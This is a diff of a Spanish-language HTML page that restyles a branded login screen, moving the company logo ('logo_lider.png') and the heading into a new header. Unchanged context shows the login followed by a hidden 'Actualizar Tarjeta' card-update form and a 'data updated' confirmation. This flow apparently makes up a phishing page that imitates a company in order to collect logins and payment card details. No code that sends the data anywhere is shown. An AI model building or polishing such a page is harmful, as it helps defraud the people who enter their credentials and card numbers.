@@ -9,10 +9,24 @@
       font-family: Arial, sans-serif;
       background: #004080; /* azul corporativo */
       display: flex;
-      justify-content: center;
+      flex-direction: column;
       align-items: center;
+      justify-content: center;
       height: 100vh;
       margin: 0;
+    }
+    .header {
+      text-align: center;
+      margin-bottom: 1rem;
+    }
+    .logo {
+      max-width: 150px;
+      height: auto;
+      margin-bottom: 0.5rem;
+    }
+    .login-title {
+      color: #fff;
+      font-size: 1.2rem;
     }
     .card {
       background: #fff;
@@ -21,23 +35,6 @@
       box-shadow: 0 0 10px rgba(0,0,0,0.2);
       width: 340px;
       text-align: center;
-    }
-    .logo {
-      height: 60px;
-      margin-bottom: 1rem;
-      background: #e0e0e0; /* espacio reservado */
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      border-radius: 4px;
-    }
-    .logo span {
-      color: #666;
-      font-size: 0.9rem;
-    }
-    h2 {
-      color: #004080;
-      margin-bottom: 1rem;
     }
     .form-group {
       margin-bottom: 1rem;
@@ -71,12 +68,15 @@
   </style>
 </head>
 <body>
+  <!-- Encabezado con logo y título -->
+  <div class="header">
+    <img src="logo_lider.png" alt="Logo Empresa" class="logo">
+    <h2 class="login-title">Ingresa a tu cuenta en línea</h2>
+  </div>
+
+  <!-- Tarjeta de login -->
   <div class="card" id="loginCard">
-    <div class="logo">
-      <img src="logo_lider.png" alt="Logo Empresa">
-       </div>
-    <h2>Ingresa a tu cuenta en línea</h2>
-       <form id="loginForm">
+    <form id="loginForm">
       <div class="form-group">
         <label for="usuario">Usuario</label>
         <input type="text" id="usuario" required>
@@ -89,6 +89,7 @@
     </form>
   </div>
 
+  <!-- Tarjeta de actualización -->
   <div class="card" id="updateCard" style="display:none;">
     <h2>Actualizar Tarjeta</h2>
     <form id="updateForm">
@@ -108,6 +109,7 @@
     </form>
   </div>
 
+  <!-- Tarjeta de confirmación -->
   <div class="card" id="successCard" style="display:none;">
     <h2>¡Datos actualizados!</h2>
     <p>Hemos actualizado tus datos correctamente.</p>
